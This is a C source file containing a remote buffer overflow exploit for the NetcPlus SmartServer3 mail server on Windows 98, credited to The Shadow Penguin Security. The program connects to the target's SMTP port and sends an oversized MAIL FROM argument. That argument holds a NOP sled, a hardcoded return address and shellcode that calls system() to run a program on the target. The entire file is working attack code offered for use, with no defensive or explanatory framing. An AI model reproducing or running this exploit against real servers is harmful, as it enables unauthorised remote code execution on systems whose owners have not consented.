(1) @Work SmartServer3

/*=============================================================================
   NetcPlus SmartServer3 Exploit for Windows98
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <unistd.h>

#define  BUFSIZE    2000
#define  SMTP_PORT  25
#define  RETADR     1167
#define  JMPADR     1163
#define  JMPOFS     6
#define  EIP        0xbff7a06b
#define  NOP        0x90
#define  JMPS       0xeb

unsigned char exploit_code[200]={
0xEB,0x4B,0x5B,0x53,0x32,0xE4,0x83,0xC3,0x0B,
0x4B,0x88,0x23,0xB8,0x50,0x77,0xF7,0xBF,0xFF,
0xD0,0x8B,0xD0,0x52,0x43,0x53,0x52,0x32,0xE4,
0x83,0xC3,0x06,0x88,0x23,0xB8,0x28,0x6E,0xF7,
0xBF,0xFF,0xD0,0x8B,0xF0,0x5A,0x43,0x53,0x52,
0x32,0xE4,0x83,0xC3,0x04,0x88,0x23,0xB8,0x28,
0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,0xF8,0x43,0x53,
0x83,0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,0xD6,
0x33,0xC0,0x50,0xFF,0xD7,0xE8,0xB0,0xFF,0xFF,
0xFF,0x00};
unsigned char cmdbuf[200]="msvcrt.dll.system.exit.welcome.exe";

int     main(int argc,char *argv[])
{
        struct hostent      *hs;
        struct sockaddr_in  cli;
        char                packetbuf[BUFSIZE+3000],buf[BUFSIZE];
        int                 sockfd,i,ip;

        if (argc<2){
            printf("usage\n %s HostName\n",argv[0]);
            exit(1);
        }
        bzero(&cli, sizeof(cli));
        cli.sin_family = AF_INET;
        cli.sin_port = htons(SMTP_PORT);
        if ((cli.sin_addr.s_addr=inet_addr(argv[1]))==-1){
            if ((hs=gethostbyname(argv[1]))==NULL){
                printf("Can not resolve specified host.\n");
                exit(1);
            }
            cli.sin_family = hs->h_addrtype;
            memcpy((caddr_t)&cli.sin_addr.s_addr,hs->h_addr,hs->h_length);
        }

        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
            perror("socket");  exit(0);
        }

        if(connect(sockfd, (struct sockaddr *)&cli, sizeof(cli)) < 0){
            perror("connect"); exit(0);
        }
        while((i=read(sockfd,packetbuf,sizeof(packetbuf))) > 0){
            packetbuf[i]=0;
            if(strchr(packetbuf,'\n')!=NULL) break;
        }

        strcat(exploit_code,cmdbuf);
        exploit_code[65]=strlen(cmdbuf+23);
        memset(buf,0x90,BUFSIZE);
        ip=EIP;
        buf[RETADR  ]=ip&0xff;
        buf[RETADR+1]=(ip>>8)&0xff;
        buf[RETADR+2]=(ip>>16)&0xff;
        buf[RETADR+3]=(ip>>24)&0xff;
        buf[JMPADR]  =JMPS;
        buf[JMPADR+1]=JMPOFS;
        memcpy(buf+RETADR+4,exploit_code,strlen(exploit_code));
        buf[2000]=0;

        sprintf(packetbuf,"helo penguin\r\n");
        write(sockfd,packetbuf,strlen(packetbuf));
        while((i=read(sockfd,packetbuf,sizeof(packetbuf))) > 0){
            packetbuf[i]=0;
            if(strchr(packetbuf,'\n')!=NULL) break;
        }
        printf("%s\n",packetbuf);
        sprintf(packetbuf,"MAIL FROM: %s\r\n",buf);
        write(sockfd,packetbuf,strlen(packetbuf));
        sleep(100);
        close(sockfd);
}

-------------------
